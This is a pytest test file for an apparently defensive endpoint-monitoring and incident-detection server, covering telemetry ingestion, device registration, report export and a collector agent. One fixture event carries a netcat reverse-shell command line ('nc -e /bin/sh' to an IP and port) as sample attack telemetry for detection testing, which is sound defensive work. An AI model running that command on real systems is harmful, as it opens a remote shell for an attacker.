import pytest
import os
import sys
import datetime

# Ensure project root is in python path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from web.server import (
    ingest_live_telemetry,
    export_incident_report,
    get_agent_status,
    get_monitored_devices,
    register_client_device,
    ingest_client_telemetry,
    IngestBatchRequest,
    ClientDeviceRegisterRequest,
    ClientTelemetryBatchRequest,
    trigger_simulation,
    SimulationRequest
)
from generator.models import ScenarioType
from agent.collector import EndpointCollectorAgent

def test_live_ingest_api_and_report_export():
    # 1. Test Ingestion API endpoint function directly
    payload = IngestBatchRequest(
        agent_id="test-agent-01",
        hostname="prod-host-alpha",
        device_info={
            "os_name": "Linux",
            "os_release": "6.1.0",
            "architecture": "x86_64",
            "cpu_cores": 8,
            "total_ram_gb": 16.0,
            "ip_address": "192.168.1.50"
        },
        events=[
            {
                "id": "evt-ingest-101",
                "timestamp": "2026-08-17T21:40:00.000Z",
                "log_type": "auditd.log",
                "user": "root",
                "process_name": "nc",
                "command_line": "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
                "raw_message": 'type=SYSCALL msg=audit(1786982000.100:1001): syscall=59 uid=33(www-data) exe="/usr/bin/nc.traditional" key="exec"',
                "details": {
                    "process_name": "nc",
                    "user": "www-data"
                }
            }
        ]
    )

    data = ingest_live_telemetry(payload)
    assert data["status"] == "success"
    assert data["ingested_count"] == 1

    # 2. Test Agent Status endpoint
    status_data = get_agent_status()
    assert status_data["active_agents_count"] >= 1
    assert status_data["total_ingested_events"] >= 1

    # 3. Trigger simulation to generate alert for report export test
    sim_req = SimulationRequest(scenario=ScenarioType.BRUTE_FORCE, num_failures=10)
    trigger_res = trigger_simulation(sim_req)
    assert trigger_res["status"] == "success"

    # 4. Test Incident Report Export endpoint function
    from engine.detection_engine import DetectionEngine
    from web.server import detection_engine
    alerts = detection_engine.alert_manager.get_all_alerts(10)
    assert len(alerts) > 0
    target_alert_id = alerts[0].alert_id

    report = export_incident_report(target_alert_id)
    assert report["report_id"] == f"REP-{target_alert_id}"
    assert "incident_overview" in report
    assert "forensic_evidence" in report
    assert "siem_conversions" in report

def test_client_device_registration_and_telemetry():
    # Test client browser device registration
    reg_req = ClientDeviceRegisterRequest(
        device_id="client-test-device-99",
        device_type="Client Browser Endpoint",
        hostname="browser-node-win",
        os="Windows 11 (x64)",
        browser="Google Chrome",
        ip_address="192.168.1.100",
        cpu_cores=12,
        device_memory_gb=32.0,
        screen_res="2560x1440",
        user="test-analyst"
    )
    reg_res = register_client_device(reg_req)
    assert reg_res["status"] == "success"
    assert reg_res["device_id"] == "client-test-device-99"

    # Test client telemetry stream ingestion
    tel_req = ClientTelemetryBatchRequest(
        device_id="client-test-device-99",
        hostname="browser-node-win",
        events=[
            {
                "id": "clt-evt-1",
                "log_type": "client.telemetry",
                "raw_message": "client device heartbeat active",
                "event_id": "CLIENT_HEARTBEAT"
            }
        ]
    )
    tel_res = ingest_client_telemetry(tel_req)
    assert tel_res["status"] == "success"
    assert tel_res["ingested_count"] == 1

    # Test devices listing endpoint
    dev_data = get_monitored_devices()
    assert dev_data["active_devices_count"] >= 1
    device_ids = [d["device_id"] for d in dev_data["devices"]]
    assert "client-test-device-99" in device_ids

def test_collector_agent_instantiation_and_device_acquisition():
    agent = EndpointCollectorAgent(server_url="http://127.0.0.1:8000", agent_id="unit-test-agent")
    assert agent.agent_id == "unit-test-agent"
    
    # Test device hardware acquisition
    details = agent.acquire_device_details()
    assert "hostname" in details
    assert "os_name" in details
    assert "cpu_cores" in details
    assert details["cpu_cores"] >= 1

    # Test process collection
    events = agent.collect_system_processes()
    assert isinstance(events, list)

    # Test network collection
    net_events = agent.collect_network_telemetry()
    assert isinstance(net_events, list)

def test_bridge_utilities():
    from bridge import is_server_online
    # An invalid server URL should safely return False
    assert is_server_online("http://127.0.0.1:59999") is False

